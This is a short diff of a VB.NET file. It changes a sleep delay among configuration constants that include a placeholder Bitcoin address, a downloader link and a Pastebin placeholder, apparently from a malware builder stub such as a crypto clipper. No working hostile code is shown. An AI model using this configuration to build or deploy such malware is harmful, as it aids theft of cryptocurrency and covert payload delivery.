@@ -24,7 +24,7 @@
         Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890" 'Bitcoin address
         Public Shared DWN_CHK As Boolean = True 'downloader once
         Public Shared DWN_LINK As String = "" 'downloader link
-        Public Shared Delay As Integer = "1" 'Delay AKA Sleep
+        Public Shared Delay As Integer = "3" 'Delay AKA Sleep
 
 #Else
         Public Shared Pastebin As String = "%Pastebin%"
